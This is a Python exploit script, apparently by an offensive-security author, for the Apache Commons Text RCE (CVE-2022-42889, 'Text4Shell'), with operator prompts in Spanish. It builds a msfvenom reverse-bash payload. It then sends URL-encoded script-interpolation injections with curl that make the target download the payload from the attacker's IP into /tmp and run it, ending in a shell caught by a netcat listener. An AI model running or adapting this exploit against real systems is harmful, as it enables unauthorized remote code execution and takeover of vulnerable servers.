#!/usr/bin/env python3
# coding=utf-8
# EXPLOIT AUTHOR
# Vicky Aryan (@pwnb0y)
# Apache Commons Text Vulnerability [CVE-2022-42889] 
# Affects Commons Text versions 1.5 through 1.9
# this exploit will work only if the target has netcat installed on their system.

from termcolor import cprint
import sys
import argparse
import subprocess
import shutil
import os
import subprocess
def banner():
 import pyfiglet as pf
 figlet1=pf.figlet_format("Riskoo T3XT4SH3LL")
 cprint(figlet1,'red')
 cprint(' developed by @Riskoo1','green')
 print('-'*50)
 cprint('[•] CVE-2022-42889 - Apache Commons Text RCE Exploit', "green")
 cprint("[•] USE: python3 text4shell.py -u http://192.168.x.x:8080/search?query= -i 192.168.x.x -p 21 -n shell2",'blue')
banner()
if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)
    


parser=argparse.ArgumentParser(description="Apache Commons Text RCE Exploit")
parser.add_argument('-u','--url',help="Enter URL with parameter like: https://example.com/page?param=",required=True)
parser.add_argument('-i','--ip',help="Local IP address", required=True)
parser.add_argument('-p','--port',help="Local Port default port is 4444",default=4444)
parser.add_argument('-n','--shellname',help="shellname",default="shell")
parser.add_argument('-t','--type',help="Shell type default type is sh",default='sh')
args=parser.parse_args()

import os
import subprocess

def ejecutar_exploit(args):
    # Creamos el msfvenom
    cprint('\n\n  [•] Creando la Shell', "green")
     ##cprint(f'\n     msfvenom -p linux/x64/shell_reverse_tcp LHOST={args.ip} LPORT={args.port} -f elf -o {args.shellname}', "yellow")
    
    
    ##comando = f'msfvenom -p linux/x64/shell_reverse_tcp LHOST={args.ip} LPORT={args.port} -f elf -o {args.shellname}'
    cprint(f'msfvenom -p cmd/unix/reverse_bash LHOST={args.ip} LPORT={args.port} -f raw -o {args.shellname}', "yellow")
    comando=f'msfvenom -p cmd/unix/reverse_bash LHOST={args.ip} LPORT={args.port} -f raw -o {args.shellname}'
    os.system(comando)

    # Montamos un servidor python en segundo plano
    cprint('\n\n  [•] Por favor abre una consola nueva , en el mismo directorio en el que estamos y monta un servidor', "green")
    cprint(f'\n     python3 -m http.server 80 ', "yellow")
    cprint('\n     Te espero a que lo montes', "green")
    input("Presiona cualquier tecla para continuar...")

    # Subimos el exploit
    cprint('\n\n  [•] Subimos el exploit', "green")
    cprint(f'\n     curl -X GET "{args.url}$%7Bscript:javascript:java.lang.Runtime.getRuntime().exec(%27wget+{args.ip}/{args.shellname}+-o+/tmp/{args.shellname}%27)%7D"', "yellow")
    ##comando = f'curl -X GET "{args.url}$%7Bscript:javascript:java.lang.Runtime.getRuntime().exec(%27wget+{args.ip}/{args.shellname}+-o+/tmp/{args.shellname}%27)%7D"'
    ##os.system(comando)
    comando = f'curl -X GET "{args.url}%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27curl%20{args.ip}%2F{args.shellname}%20-o%20%2Ftmp%2F{args.shellname}%27%29%7D"'
    os.system(comando)

    ##input("\n     Presiona cualquier tecla para continuar... Segunda Opción")
    ##comando =f'     curl -X GET "{args.url}$%7Bscript:javascript:java.lang.Runtime.getRuntime().exec(%27chmod+755+/tmp/{args.shellname}%27)%7D"'
    ##os.system(comando)

    # Monta un nc
    cprint(f'\n\n  [•] Monta un nc por el puerto {args.port}. Te espero, dale una tecla para continuar', "green")
    cprint(f'\n     rlwrap nc -lnvp {args.port}. Te espero, dale una tecla para continuar', "yellow")
    input("\n     Presiona cualquier tecla para continuar...")

    comando = f'curl -X GET "{args.url}%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27bash%20%2Ftmp%2F{args.shellname}%27%29%7D"'
    os.system(comando)
    

def main():
    try:
        # Lógica principal del programa
        # ...

        # Llamada a la función para ejecutar el exploit
        ejecutar_exploit(args)

        # ...

    except Exception as e:
        # Manejo de excepciones
        print(f"Se produjo un error: {str(e)}")

if __name__ == "__main__":
    main()
